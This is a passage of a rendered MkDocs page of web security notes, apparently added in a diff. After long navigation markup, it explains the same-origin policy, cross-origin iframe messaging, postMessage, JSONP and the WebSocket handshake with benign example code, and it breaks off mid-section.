+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directives-and-values" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directives and Values
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp-level-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP Level 2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-dynamic" class="md-nav__link">
+    <span class="md-ellipsis">
+      strict-dynamic
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#universal-csp-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Universal CSP Policy
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-example_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Example
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Example">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common example
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQL injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defenses
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../oop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    面向对象
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocol/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    系统工具
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#same-origin-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Same Origin Policy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Same Origin Policy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#definition" class="md-nav__link">
+    <span class="md-ellipsis">
+      Definition
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      iframe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ajax" class="md-nav__link">
+    <span class="md-ellipsis">
+      AJAX
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AJAX">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jsonp" class="md-nav__link">
+    <span class="md-ellipsis">
+      JSONP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#websocket" class="md-nav__link">
+    <span class="md-ellipsis">
+      WebSocket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cors" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session Attack
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-and-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session and Cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session hijacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#over-http-steal-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Over Http steal cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-steal-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS steal cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSRF
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Type
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Example
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Example">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#html-elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML elements
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-attributes" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML attributes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script elements
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#never-safe-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Never safe context
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS defenses
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directives-and-values" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directives and Values
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp-level-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP Level 2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-dynamic" class="md-nav__link">
+    <span class="md-ellipsis">
+      strict-dynamic
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#universal-csp-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Universal CSP Policy
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-example_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Example
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Example">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common example
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQL injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defenses
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="web-security">Web Security<a class="headerlink" href="#web-security" title="Permanent link">&para;</a></h1>
+<h2 id="same-origin-policy">Same Origin Policy<a class="headerlink" href="#same-origin-policy" title="Permanent link">&para;</a></h2>
+<p>Two pages from different sources should not be allowed to interface with each other! This is the fundamental security model of the web. The browser is analogous to an OS kernel, an origin is analogous to an OS process, so site rely on the browser to enfoce all the system security rules.</p>
+<h3 id="definition">Definition<a class="headerlink" href="#definition" title="Permanent link">&para;</a></h3>
+<p>The origin means <code>protocal-host-port</code> tuple, this can be described as:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">def</span> <span class="nf">isSameOrigin</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">url2</span><span class="p">):</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span class="k">return</span> <span class="n">url1</span><span class="o">.</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">url2</span><span class="o">.</span><span class="n">protocal</span> <span class="ow">and</span> <span class="n">url1</span><span class="o">.</span><span class="n">hostname</span> <span class="o">==</span> <span class="n">url2</span><span class="o">.</span><span class="n">hostname</span> <span class="ow">and</span> <span class="n">url1</span><span class="o">.</span><span class="n">port</span> <span class="o">==</span> <span class="n">url2</span><span class="o">.</span><span class="n">port</span>
+</code></pre></div></p>
+<p>If two sites do not comply with same origin policy, they can't:</p>
+<ul>
+<li>Read each other's Cookie,LocalStorage,IndexdDB</li>
+<li>Get each other's DOM</li>
+<li>Send to each other AJAX request</li>
+</ul>
+<p>But they can embed static resources from another origin, like Images,Scripts,Styles.</p>
+<p>Sometimes policy is too narrow, it's difficult to get <code>login.stanford.edu</code> and <code>axess.stanford.edu</code> to exchange data; but sometimes it's too broad, there is no way to isolate <code>https://web.stanford.edu/class/cs106a/</code> and <code>https://web.stanford.edu/class/cs253/</code>. We need a way around Same Origin Policy to allow two different origins to communicate.</p>
+<h3 id="cookie">Cookie<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h3>
+<p>If two sites have a top-level domain, different sub domain, e.g.<code>login.stanford.edu</code> and <code>axess.stanford.edu</code>, then they can define:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;stanford.edu&#39;</span><span class="p">;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;userid=test1&quot;</span><span class="p">;</span>
+</code></pre></div>
+and the axess site can read the cookie. More examples:</p>
+<table>
+<thead>
+<tr>
+<th>Originating URL</th>
+<th style="text-align: center;">document.domain</th>
+<th>Accessed URL</th>
+<th style="text-align: center;">document.domain</th>
+<th style="text-align: center;">Allowed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>http://www.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td>http://pay.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td style="text-align: center;">YES</td>
+</tr>
+<tr>
+<td>http://www.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td>https://pay.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td style="text-align: center;">NO</td>
+</tr>
+<tr>
+<td>http://pay.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td>http://a.com/</td>
+<td style="text-align: center;">(not set)</td>
+<td style="text-align: center;">NO</td>
+</tr>
+<tr>
+<td>http://www.a.com/</td>
+<td style="text-align: center;">(not set)</td>
+<td>http://www.a.com/</td>
+<td style="text-align: center;">a.com</td>
+<td style="text-align: center;">NO</td>
+</tr>
+</tbody>
+</table>
+<p>Another way to do this is to use server response:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Set-Cookie: userid=test1; domain=.stanford.edu; path=/
+</code></pre></div>
+Both resolution can't resolve the <code>attack.stanford.edu</code> access content from <code>axess.stanford.edu</code>, so it's bad!</p>
+<h3 id="iframe">iframe<a class="headerlink" href="#iframe" title="Permanent link">&para;</a></h3>
+<p>If two sites not match Same Origin Policy, they can't get each other's DOM. For example, when you use <code>iframe</code> or <code>window.open</code> to open a new child window, they can not communicate with the parent window. 
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;myIFrame&quot;</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span>
+</code></pre></div>
+There are 3 ways to resolve this situation.</p>
+<p><strong>fragment identifier</strong></p>
+<p>For a url <code>http://example.com/x.html#fragment</code>, the content after <code>#</code> is fragment, when you change the fragment, the page does not refresh.</p>
+<p>So the parent window can write data to child window's fragment like this:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;#&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;myIFrame&#39;</span><span class="p">).</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">src</span><span class="p">;</span>
+</code></pre></div>
+Then the child window can monitor an event named <code>hashchange</code> to get the notice:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">window</span><span class="p">.</span><span class="nx">onhashchange</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">checkMessage</span><span class="p">;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kd">function</span><span class="w"> </span><span class="nx">checkMessage</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="c1">// ...</span>
+</code></pre></div>
+The child window also can change parent window's fragment:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nx">parent</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;#&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">hash</span><span class="p">;</span>
+</code></pre></div></p>
+<p><strong>window.name</strong></p>
+<p>Each browser window has a <code>window.name</code> property, this property has a quality, even if the page jump to a new location, the <code>window.name</code> will still be retained.</p>
+<p>For example, the <code>http://parent.com/a.html</code> has a iframe src to <code>http://child.com</code>. When the child page loaded it can set it's <code>window.name=data</code>, and then use <code>location.href='http://parent.com/empty'</code>to redirect the same origin page as parent. Now the parent can get the data simple use <code>$('iframe').contentWindow.name</code>.</p>
+<p>This property can exchange serveral MB data once, but monitor the child window name change is a performance loss.</p>
+<p><strong>window.postMessage</strong></p>
+<p>The above methods are hack method, the <code>window.postMessage</code> is a new cross-document messaging API design to resolve this situation. It can be used for complicated objects, handle cycles, read/write localstorage etc.</p>
+<p>For example, when the parent window want to send a message to child:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">popup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;http://child.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;title&#39;</span><span class="p">);</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nx">popup</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Hello World!&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;http://child.com&#39;</span><span class="p">);</span>
+</code></pre></div>
+The first parameter of <code>postMessage</code> method is data, the second is origin(<code>protocal-host-port</code> tuple), also can use <code>*</code> represent all window.  </p>
+<p>The child also can send message to parent:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Nice to see you&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;http://parent.com&#39;</span><span class="p">);</span>
+</code></pre></div></p>
+<p>They both can monitor message use a <code>message</code> event:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="p">},</span><span class="kc">false</span><span class="p">);</span>
+</code></pre></div></p>
+<p><code>event</code> object has 3 property, <code>event.data</code> is the content of this message, <code>event.source</code> means which window send this message, <code>event.origin</code> means which origin send this message. So you can filter the message which not send to you and send back directly which send to you.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">receiveMessage</span><span class="p">);</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="kd">function</span><span class="w"> </span><span class="nx">receiveMessage</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;http://parent.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;Hello World&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">      </span><span class="nx">event</span><span class="p">.</span><span class="nx">source</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Hello back&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="p">}</span>
+</code></pre></div></p>
+<h3 id="ajax">AJAX<a class="headerlink" href="#ajax" title="Permanent link">&para;</a></h3>
+<p>Except for build a proxy server to respect same origin policy, there are other 3 ways,  JSONP, WebSocket and CORS.</p>
+<h4 id="jsonp">JSONP<a class="headerlink" href="#jsonp" title="Permanent link">&para;</a></h4>
+<p>The JSONP is an old hack method for client and server cross origin communicate.It can support old browser and small change for the server side.</p>
+<p>The key idea is client add a html element <code>&lt;script&gt;</code>, through the attribute <code>src</code> send request to the server side. When the server side reponse data, they put data into a particular callback function.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">addScriptTag</span><span class="p">(</span><span class="nx">src</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">  </span><span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">,</span><span class="s2">&quot;text/javascript&quot;</span><span class="p">);</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">  </span><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">src</span><span class="p">;</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="p">}</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">  </span><span class="nx">addScriptTag</span><span class="p">(</span><span class="s1">&#39;http://example.com/ip?callback=foo&#39;</span><span class="p">);</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="p">}</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="kd">function</span><span class="w"> </span><span class="nx">foo</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Your public IP address is: &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="p">};</span>
+</code></pre></div>
+The above code dynamic add the <code>&lt;script&gt;</code> element and sent request to <code>example.com</code>, and the request url contains a callback parameter names <code>foo</code>. Then the server recive the request and put data into the callback funtion to response.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>foo({
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  &quot;ip&quot;:&quot;8.8.8.8&quot;
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>})
+</code></pre></div>
+Because of the html element <code>&lt;script&gt;</code> request script will directly run in the browser, and the function <code>foo</code> is defined before, so it will be call.</p>
+<h4 id="websocket">WebSocket<a class="headerlink" href="#websocket" title="Permanent link">&para;</a></h4>
+<p>The WebSocket is a kind of communicate protocol, it use <code>ws://</code> and <code>wss://</code>(encrypt) for the scheme. This protocol does not obey the same origin policy. If the server side supported, you can communicate with different origin.</p>
+<p>The browser send request like this:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>GET /chat HTTP/1.1
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Host: server.example.com
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Upgrade: websocket
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Connection: Upgrade
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>Sec-WebSocket-Protocol: chat, superchat
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Sec-WebSocket-Version: 13
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>Origin: http://example.com
+</code></pre></div>
+The server side can decide whether not send response back base on the <code>origin</code> attribute.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>HTTP/1.1 101 Switching Protocols
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Upgrade: websocket
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Connection: Upgrade
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
